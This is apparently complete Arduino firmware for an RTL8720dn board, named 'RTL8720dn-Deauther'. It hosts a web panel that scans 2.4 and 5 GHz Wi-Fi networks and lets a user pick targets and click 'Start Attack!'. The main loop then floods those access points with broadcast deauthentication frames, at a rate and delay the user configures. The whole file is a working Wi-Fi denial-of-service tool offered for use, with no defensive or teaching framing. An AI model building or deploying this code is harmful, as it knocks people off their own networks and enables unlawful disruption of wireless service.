#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

char *ssid = "RTL8720dn-Deauther";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::map<int, std::vector<int>> deauth_channels;
std::vector<int> chs_idx;
uint32_t current_ch_idx = 0;
uint32_t sent_frames = 0;

WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

int frames_per_deauth = 5;
int send_delay = 5;
bool isDeauthing = false;
bool led = true;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ');
  if (path_start < 0) return "/";
  path_start += 1;
  int path_end = request.indexOf(' ', path_start);
  if (path_end < 0) return "/";
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value}); // Add the key-value pair to the vector
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }

    return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, minimal-ui">
    <meta name="theme-color" content="#36393E">
    <title>RTL8720dn-Deauther</title>
    <style>
    /* Base on Spacehuhn css file. Copyright (c) 2020 Spacehuhn Technologies: https://github.com/spacehuhntech/esp8266_deauther */
      body {
        background: #36393e;
        color: #bfbfbf;
        font-family: sans-serif;
      }

      h3{
        background: #2f3136;
        color: #bfbfbb;
        padding: .2em 1em;
        border-radius: 3px;
        // border-left: solid #20c20e 5px;
        font-weight: 100;
        text-align: center;
        width: 50%;
      }

      .centered{
        display: flex;
        justify-content: center;
      }
      h1 {
        font-size: 1.7rem;
        margin-top: 1rem;
        background: #2f3136;
        color: #bfbfbb;
        padding: .2em 1em;
        border-radius: 3px;
        border-left: solid #20c20e 5px;
        border-right: solid #20c20e 5px;
        font-weight: 100;
        text-align: center;
      }

      h2 {
        font-size: 1.1rem;
        margin-top: 1rem;
        background: #2f3136;
        color: #bfbfbb;
        padding: .4em 1em;
        border-radius: 3px;
        border-left: solid #20c20e 5px;
        font-weight: 100;
      }

      table {
        border-collapse: collapse;
        width: 100%;
        min-width: auto;
        margin-bottom: 2em;
      }

      td {
        word-break: keep-all;
        // padding: 10px 6px;
        text-align: left;
        border-bottom: 1px solid #5d5d5d;
      }
      
      .tdMeter {
        word-break: break-all;
        // padding: 10px 6px;
        padding-right: 10px;
        text-align: left;
        border-bottom: 1px solid #5d5d5d;
      }

      .tdFixed{
        word-break: keep-all;
        padding: 10px 6px;
        text-align: center;
        border-bottom: 1px solid #5d5d5d;
      }

      th {
          word-break: break-word;
          // padding: 10px 6px;
          text-align: left;
          border-bottom: 1px solid #5d5d5d;
      }

      p {
        margin: .5em 0;
      }
      .bold {
        font-weight: bold;
      }

      .right {
        display: flex;
        flex-direction: row-reverse;
      }

      .container {
        display: flex;
        flex-direction: column;
        width: 100%;
      }

      .checkBoxContainer {
        display: block;
        position: relative;
        padding-left: 25px;
        margin-bottom: 12px;
        cursor: pointer;
        font-size: 22px;
        user-select: none;
        height: 32px;
      }

      .checkBoxContainer input {
        position: absolute;
        opacity: 0;
        cursor: pointer;
      }

      .checkmark {
        position: absolute;
        top: 8px;
        left: 0;
        height: 28px;
        width: 28px;
        background-color: #2F3136;
        border-radius: 4px;
      }

      .checkmark:after {
        content: "";
        position: absolute;
        display: none;
      }

      .checkBoxContainer input:checked ~ .checkmark:after {
        display: block;
      }

      .checkBoxContainer .checkmark:after {
        left: 10px;
        top: 7px;
        width: 4px;
        height: 10px;
        border: solid white;
        border-width: 0 3px 3px 0;
        transform: rotate(45deg);
      }
              /* Meter */
      .meter_background{
        background: #42464D;
        // width: 100%;
        word-break: normal;
        // min-width: 100px;
        // min-width: 45px;
      }
      .meter_forground{
        color: #fff;
        padding: 4px 0;
        /* + one of the colors below
        (width will be set by the JS) */
      }
      .meter_green{
        background: #43B581;
      }
      .meter_orange{
        background: #FAA61A;
      }
      .meter_red{
        background: #F04747;
      }
      .meter_value{
        padding-left: 8px;
      }

      @keyframes fadeIn {
        0% {
            opacity: 0;
        }
        100% {
            opacity: 1;
        }
      }

      hr {
        background: #3e4146;
      }
      
      .button-container {
        display: flex; /* Usar flexbox */
        justify-content: start; /* Espacio entre los botones */
        align-items: center; /* Centra los elementos horizontalmente */
        align-content: center;
        column-gap: 15px;
      }

      .button-double{
        display: flex; /* Usar flexbox */
        flex-direction: column;
        justify-content: start; /* Espacio entre los botones */
        align-items: center; /* Centra los elementos horizontalmente */
        align-content: center;
        row-gap: 15px;
      }

      .upload-script,
      .button,
      button,
      input[type=submit],
      input[type=reset],
      input[type=button] {
        display: inline-block;
        height: 38px;
        // padding: 0 20px;
        color: #fff;
        text-align: center;
        font-size: 11px;
        font-weight: 600;
        line-height: 38px;
        letter-spacing: .1rem;
        text-transform: uppercase;
        text-decoration: none;
        white-space: nowrap;
        background: #2f3136;
        border-radius: 4px;
        border: 0;
        cursor: pointer;
        box-sizing: border-box;
      }

      button:hover,
      input[type=submit]:hover,
      input[type=reset]:hover,
      input[type=button]:hover {
        background: #42444a;
      }

      button:active,
      input[type=submit]:active,
      input[type=reset]:active,
      input[type=button]:active {
        transform: scale(.93);
      }

      button:disabled:hover,
      input[type=submit]:disabled:hover,
      input[type=reset]:disabled:hover,
      input[type=button]:disabled:hover {
        background: white;
        cursor: not-allowed;
        opacity: .40;
        filter: alpha(opacity=40);
        transform: scale(1);
      }

      button::-moz-focus-inner {
        border: 0;
      }

      input[type=email],
      input[type=number],
      input[type=search],
      input[type=text],
      input[type=tel],
      input[type=url],
      input[type=password],
      textarea,
      select {
        text-align: center;
        height: 38px;
        padding: 0 5px;
      }

      .shortInput{
        width: 28px;
      }

      .longInput{
        width: 138px;
      }
    </style>
  </head>
  <body>
  <div class="container">
    <h1 class="bold">RTL8720dn-Deauther</h1>
      <div class="right">
        <div class="button-container">
          <form method="post" action="/rescan">
              <input type="submit" value="Rescan Network">
          </form>
          <form method="post" action="/refresh">
              <input type="submit" value="Refresh page">
          </form>
        </div>
      </div>
      <form method="post" action="/deauth">
      <h2>Access Points: )" + String(scan_results.size()) + R"(</h2>
      <div class="centered">
        <h3 class="bold">5 GHz networks</h3>  
      </div>
        <table>
          <tr>
            <th>SSID</th>
            <th class='tdFixed'>CH</th>
            <th>BSSID</th>
            <th>RSSI</th>
            <th class='tdFixed'></th>
            <th class='selectColumn'></th>
          </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].channel >= 36) {
      String color = "";
      int width = scan_results[i].rssi + 120;
      int colorWidth = scan_results[i].rssi + 130;

      if (colorWidth < 50) color = "meter_red";
      else if (colorWidth < 70) color = "meter_orange";
      else color = "meter_green";

      response += "<tr>";
      response += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
      response += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
      response += "<td>" + scan_results[i].bssid_str + "</td>";
      response += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
      response += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
      response += "</tr>";
    }
  }
  response += R"(
        </table>
        <div class="centered">
          <h3 class="bold">2.4 GHz networks</h3>  
        </div>
          <table>
            <tr>
              <th>SSID</th>
              <th class='tdFixed'>CH</th>
              <th>BSSID</th>
              <th>RSSI</th>
              <th class='tdFixed'></th>
              <th class='selectColumn'></th>
            </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].channel <= 14) {
      String color = "";
      int width = scan_results[i].rssi + 120;
      int colorWidth = scan_results[i].rssi + 130;

      if (colorWidth < 50) color = "meter_red";
      else if (colorWidth < 70) color = "meter_orange";
      else color = "meter_green";
      
      response += "<tr>";
      response += "<td>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "**HIDDEN**") + "</td>";
      response += "<td class='tdFixed'>" + String(scan_results[i].channel) + "</td>";
      response += "<td>" + scan_results[i].bssid_str + "</td>";
      response += "<td class='tdMeter'><div class='meter_background'> <div class='meter_forground " + String(color) + "' style='width: " + String(width) + "%'><div class='meter_value'>" + String(scan_results[i].rssi) + "</div></div></div></td>";
      response += "<td><label class='checkBoxContainer'><input type='checkbox' name='network' value='" + String(i) + "'><span class='checkmark'></span></label></td>";
      response += "</tr>";
    }
  }
  response += R"(
        </table>
            <div class="right">
              <div class="button-container">
                <input type="submit" value="Start Attack!">  
              </div>
            </div>
      </form>
      <div class="right">
        <form method="post" action="/stop">
          <div class="button-container">
            <input type="submit" value="Stop">
          </div>
        </form>
      </div>
      <h2>Dashboard</h2>
    <table>
      <tr><th>State</th><th>Current Value</th></tr>
  )";
  response += "<tr><td>Status Attack</td><td>" + String(isDeauthing ? "Running" : "Stopped") + "</th></tr>";
  response += "<tr><td>LED Enabled</td><td>" + String(led ? "Yes" : "No") + "</th></tr>";
  response += "<tr><td>Frame Sent</td><td>" + String(sent_frames) + "</th></tr>";
  response += "<tr><td>Send Delay</td><td>" + String(send_delay) + "</th></tr>";
  response += "<tr><td>Number of frames send each time</td><td>" + String(frames_per_deauth) + "</th></tr>";
  response += "</table>";
  response += R"(
    <h2>Setup</h2>
      <div class="right">
        <div class="button-double">
          <form method="post" action="/setframes">
            <div class="button-container">
              <input class="longInput" type="text" name="frames" placeholder="Number of frames">
              <input type="submit" value="Set frames">
            </div>
          </form>

          <form method="post" action="/setdelay">
            <div class="button-container">
              <input class="longInput" type="text" name="delay" placeholder="Send frames delay">
              <input type="submit" value="Set delay  ">
            </div>
          </form>
        </div>
      </div>
    <h2>LED Options</h2>
      <div class="right">
        <div class="button-container">
          <form method="post" action="/led_enable">
              <input class="green" type="submit" value="Turn on LED">
          </form>

          <form method="post" action="/led_disable">
              <input class="red" type="submit" value="Turn off LED">
          </form>
        </div>
      </div>
  </div>
  </body>
  </html>
  )";

  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());

  scanNetworks();

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  if (led) {
    digitalWrite(LED_R, HIGH);
  }
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    if (led) {
      digitalWrite(LED_G, HIGH);
    }
    String request;
    while (client.available()) {
      request += (char)client.read();
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      scanNetworks();
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      deauth_channels.clear();
      chs_idx.clear();
      for (auto &param : post_data) {
        if (param.first == "network") {
          int idx = String(param.second).toInt();
          int ch = scan_results[idx].channel;
          deauth_channels[ch].push_back(idx);
          chs_idx.push_back(ch);
        } else if (param.first == "reason") {
          deauth_reason = String(param.second).toInt();
        }
      }
      if (!deauth_channels.empty()) {
        isDeauthing = true;
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/setframes") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "frames") {
          int frames = String(param.second).toInt();
          frames_per_deauth = frames <= 0 ? 5 : frames;
        }
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/setdelay") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "delay") {
          int delay = String(param.second).toInt();
          send_delay = delay <= 0 ? 5 : delay;
        }
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/stop") {
      deauth_channels.clear();
      chs_idx.clear();
      isDeauthing = false;
      client.write(makeRedirect("/").c_str());
    } else if (path == "/led_enable") {
      led = true;
      digitalWrite(LED_R, HIGH);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/led_disable") {
      led = false;
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/refresh") {
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    if (led) {
      digitalWrite(LED_G, LOW);
    }
  }
  
  if (isDeauthing && !deauth_channels.empty()) {
    for (auto& group : deauth_channels) {
      int ch = group.first;
      if (ch == chs_idx[current_ch_idx]) {
        wext_set_channel(WLAN0_NAME, ch);

        std::vector<int>& networks = group.second;

        for (int i = 0; i < frames_per_deauth; i++) {
          if (led) {
            digitalWrite(LED_B, HIGH);
          }
          for (int idx : networks) {
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            sent_frames++;
          }
          delay(send_delay);
          if (led) {
            digitalWrite(LED_B, LOW);
          }
        }
      }
    }
    current_ch_idx++;
    if (current_ch_idx >= chs_idx.size()) {
      current_ch_idx=0;
    }
  }

  wext_set_channel(WLAN0_NAME, current_channel);
}